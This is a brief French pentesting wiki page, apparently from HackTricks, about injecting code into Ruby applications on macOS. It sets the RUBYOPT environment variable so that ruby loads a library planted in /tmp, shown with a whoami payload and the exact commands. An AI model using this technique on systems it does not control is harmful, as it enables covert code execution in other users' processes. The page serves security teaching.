# Injection d'applications Ruby sur macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

En utilisant cette variable d'environnement, il est possible d'**ajouter de nouveaux paramètres** à **ruby** chaque fois qu'il est exécuté. Bien que le paramètre **`-e`** ne puisse pas être utilisé pour spécifier le code ruby à exécuter, il est possible d'utiliser les paramètres **`-I`** et **`-r`** pour ajouter un nouveau dossier au chemin de chargement des bibliothèques et ensuite **spécifier une bibliothèque à charger**.

Créez la bibliothèque **`inject.rb`** dans **`/tmp`** :
```ruby:inject.rb
puts `whoami`
```
Créez n'importe où un script ruby comme :
```ruby:hello.rb
puts 'Hello, World!'
```
Ensuite, faites charger un script ruby arbitraire avec :
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Fait amusant, cela fonctionne même avec le paramètre **`--disable-rubyopt`** :
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
